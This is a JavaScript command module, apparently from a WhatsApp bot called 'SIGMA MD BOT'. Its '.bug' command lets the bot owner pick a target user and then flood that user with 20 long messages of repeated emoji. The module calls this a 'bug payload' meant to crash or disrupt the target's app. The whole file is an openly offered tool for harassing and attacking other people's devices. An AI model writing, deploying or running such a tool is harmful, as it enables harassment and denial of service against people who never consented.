module.exports = async function(sock, chatId, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(chatId, { text: '\u274C Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(chatId, { text: '\u26A0\uFE0F .bug @user or reply to user' }, { quoted: msg });
        
        await sock.sendMessage(chatId, { text: `☣️ *𝐒𝐈𝐆𝐌𝐀 𝐁𝐔𝐆 𝐄𝐗𝐄𝐂𝐔𝐓𝐎𝐑* ☣️\n\nTarget: @${target.split('@')[0]}\nStatus: Sending payload...\n\n_Please wait..._`, mentions: [target] }, { quoted: msg });
        
        // Send bug-inducing messages
        const bugChars = ['☣️', '💀', '🔥', '⚡', '💣', '🕸️', '⚠️', '🚨'];
        
        for (let i = 0; i < 20; i++) {
            try {
                const text = bugChars.join('').repeat(250) + '\n> © 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃 𝐁𝐎𝐓';
                await sock.sendMessage(target, { text });
            } catch (e) {}
        }
        
        await sock.sendMessage(chatId, { text: `✅ *𝐒𝐈𝐆𝐌𝐀 𝐁𝐔𝐆* payload delivered successfully!` }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(chatId, { text: '\u274C Error: ' + e.message }, { quoted: msg });
    }
};
